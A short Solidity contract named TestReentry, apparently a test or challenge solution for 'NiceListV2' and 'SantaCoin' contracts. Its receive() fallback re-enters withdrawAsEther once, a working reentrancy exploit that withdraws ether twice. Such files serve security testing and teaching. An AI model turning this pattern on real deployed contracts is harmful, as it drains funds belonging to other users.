pragma solidity ^0.8.9;

import "../NiceListV2.sol";
import "../SantaCoin.sol";

contract TestReentry {
    NiceListV2 public niceListV2;
    SantaCoin public santaCoin;
    uint8 reentering = 1;

    constructor(NiceListV2 _niceListV2, SantaCoin _santaCoin) {
        niceListV2 = _niceListV2;
        santaCoin = _santaCoin;
    }

    function buyIn() external payable {
        santaCoin.buyCoins{value: msg.value}();
        santaCoin.increaseAllowance(address(niceListV2), msg.value);
        niceListV2.buyIn(msg.value);
    }

    function attack(uint256 amount) public {
        niceListV2.withdrawAsEther(amount);
    }

    receive() external payable {
        if (reentering == 1) {
            reentering = 0;
            attack(msg.value);
            reentering = 1;
        }
    }
}
